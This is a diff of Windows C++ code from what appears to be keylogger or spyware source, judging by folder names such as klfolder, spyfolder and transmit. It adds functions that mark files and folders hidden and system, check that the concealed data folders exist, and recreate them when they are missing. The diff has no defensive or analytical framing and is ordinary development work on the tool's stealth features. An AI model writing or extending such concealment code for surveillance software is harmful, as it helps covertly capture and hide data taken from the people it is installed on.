@@ -25,6 +25,12 @@ void HideFile(const char *filename)
 		SetFileAttributes(filename, 0x22);
 }
 
+void HideFileHS(const char *filename)
+{
+	if (!(GetFileAttributes(filename) & (FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM)))
+		SetFileAttributes(filename, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
+}
+
 void OutTextWithTime(char *filename, char *text, control *C, ofstream &out)
 {
 	out.open(filename, ios::app | ios::out);
@@ -118,6 +124,24 @@ void CreateHiddenFolders(void)
 	HideFile(schfolder);
 	HideFile(spyfolder);
 	HideFile(transmit);
+}
+void CheckFolderExist(void)
+{
+	bool check = true;
+
+	if (DirectoryExists(gfolder) == false)
+		check = false;
+	if (DirectoryExists(klfolder) == false)
+		check = false;
+	if (DirectoryExists(schfolder) == false)
+		check = false;
+	if (DirectoryExists(spyfolder) == false)
+		check = false;
+	if (DirectoryExists(transmit) == false)
+		check = false;
+
+	if (!check)
+		CreateHiddenFolders();
 }
 void StopWhileTransmit(void)
 {
@@ -229,4 +253,12 @@ bool Checkconfig(char *filename)
 
 	ifst.close();
 	return true;
+}
+bool DirectoryExists(const char* dirName)
+{
+	DWORD attribs = GetFileAttributesA(dirName);
+	if (attribs == INVALID_FILE_ATTRIBUTES)
+		return false;
+
+	return (attribs & FILE_ATTRIBUTE_DIRECTORY);
 }
